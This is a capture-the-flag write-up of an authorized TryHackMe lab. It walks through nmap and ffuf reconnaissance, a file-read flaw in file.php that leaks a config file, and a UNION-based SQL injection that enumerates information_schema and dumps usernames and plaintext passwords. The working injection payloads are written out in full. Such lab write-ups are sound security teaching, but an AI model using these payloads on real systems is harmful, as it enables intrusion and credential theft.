# Recruit — TryHackMe Write-up

> Room: [SQL Injection Introduction](https://tryhackme.com/room/sqlinjectionintroduction)

Target machine booted...  
AttackBox booted...  
VPN connected...

Let's get into it.

## Nmap scan

I started with an Nmap scan:

```bash
nmap -sC -sV 10.49.152.230
```

```text
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
53/tcp open  domain  ISC BIND 9.16.1
80/tcp open  http    Apache httpd 2.4.41
```

Port 80 was open, so let's access the website.

![Recruit login page](images/recruit-login-page.png)

I found a login page.

I tried some basic SQL injection against the login form, but it didn't seem exploitable. So let's check out the **Access API** endpoint instead.

![Recruit API FAQ](images/recruit-api-faq.png)

Some kinda FAQ page.

In the second FAQ, I found another endpoint:

```text
/file.php?cv=<URL>
```

![File endpoint shown in the FAQ](images/file-endpoint-faq.png)

That definitely looks interesting since it accepts a URL/file-like value. I'll come back to it, but first let's check if there are any other directories hiding on the server.

## Directory fuzzing

```bash
ffuf -u http://10.49.152.230/FUZZ \
  -w /usr/share/wordlists/dirb/big.txt -s
```

```text
.htaccess
.htpasswd
assets
javascript
mail
phpmyadmin
server-status
sitemap.xml
```

`sitemap.xml` mostly revealed endpoints we already had—including `/mail`.

Inside `/mail`, I found a `mail.log` file.

And yep... one of the emails leaked some useful information about the `hr` user.

![Credential-related entry in mail.log](images/mail-log-credential-note.png)

My first thought was to lowkey use Hydra to brute-force `hr`.

> **Update from future me:** Hydra wasn't needed 😭

By that time, let's see what `/file.php` actually does.

## What does `file.php` do?

It basically works like a file reader on the web. Since it takes user-controlled input without properly restricting it, an attacker can use it to read sensitive files from the server.

So I tried checking `config.php`, because config files usually contain juicy stuff like credentials—and I couldn't access it directly through the browser.

```text
http://10.49.152.230/file.php?cv=config.php
```

![Application configuration disclosed through file.php](images/config-file-disclosure.png)

Oo...

We got the password for `hr`.

So yeah, Hydra wasn't needed after all.

I used those credentials to log in to the dashboard and got the first flag.

![Authenticated candidate dashboard](images/candidate-dashboard.png)

## SQL injection in the search feature

Yup—the search feature is vulnerable to SQL injection.

Submitting a single quote caused a MySQL syntax error, which tells us our input is being placed directly inside a database query.

![SQL error caused by a single quote](images/sql-syntax-error.png)

### Finding the number of columns

Before using `UNION SELECT`, we first need to know how many columns the original query returns.

For that, we can use:

```sql
1' ORDER BY 1-- -
```

Then increase the number one by one:

```sql
1' ORDER BY 2-- -
1' ORDER BY 3-- -
1' ORDER BY 4-- -
1' ORDER BY 5-- -
```

`ORDER BY` tells the database to sort the result using a specific column number.

So if `ORDER BY 4` works but `ORDER BY 5` throws an error, we know the query returns four columns.

![ORDER BY 5 error](images/order-by-column-error.png)

And yep—there are **4 columns**.

### Finding the database name

Now that we know there are four columns, we can use a `UNION SELECT` payload:

```sql
1' UNION SELECT 1,2,3,database()-- -
```

`database()` is a built-in MySQL function that returns the name of the database currently being used.

![Current database name](images/database-name.png)

`recruit_db` is the database name.

### Finding the tables

Now that we know the database name, we can enumerate the tables inside it.

We query `information_schema.tables`, which stores metadata about database tables, and use `group_concat()` to display all matching table names in one result.

```sql
1' UNION SELECT 1,2,3,
group_concat(table_name)
FROM information_schema.tables
WHERE table_schema='recruit_db'-- -
```

![Tables in recruit_db](images/database-tables.png)

The result reveals two tables:

```text
candidates
users
```

`users` definitely looks delicious.

### Finding the columns

Now let's enumerate the columns inside the `users` table.

`information_schema.columns` works similarly to `information_schema.tables`, except this one stores metadata about columns instead of tables.

```sql
1' UNION SELECT 1,2,3,
group_concat(column_name)
FROM information_schema.columns
WHERE table_schema='recruit_db'
  AND table_name='users'-- -
```

![Columns in the users table](images/users-table-columns.png)

And yep—we got the columns.

Out of all of them, `username` and `password` are obviously the most interesting.

And here's another major security issue: **the passwords are being stored in plaintext.**

That's a huge red flag. Passwords should never be stored directly. They should be protected using a strong one-way password hashing function, so even if the database is exposed, the original passwords aren't immediately revealed.

In this case, the SQL injection gives us access to the database, and the plaintext password storage makes the impact even worse.

### Dumping the credentials

Now that we know the interesting columns, let's dump the credentials from the `users` table.

```sql
1' UNION SELECT 1,2,3,
group_concat(username,':',password SEPARATOR '<br>')
FROM users-- -
```

`group_concat()` lets us combine multiple rows into a single result. Here, I'm joining each username with its corresponding password.

![Redacted credential dump](images/credential-dump-redacted.png)

Got it gng!!

The credentials were successfully dumped. I logged in as the admin user and, with that...

## GOT THE FLAG 🚩

This room was a nice example of how smaller issues can chain together: the file reader leaked the first credentials, the SQL injection exposed the database, and the plaintext passwords made the whole thing even worse.

> This write-up covers an authorized TryHackMe lab. Don't test these techniques against systems you don't own or have permission to assess.
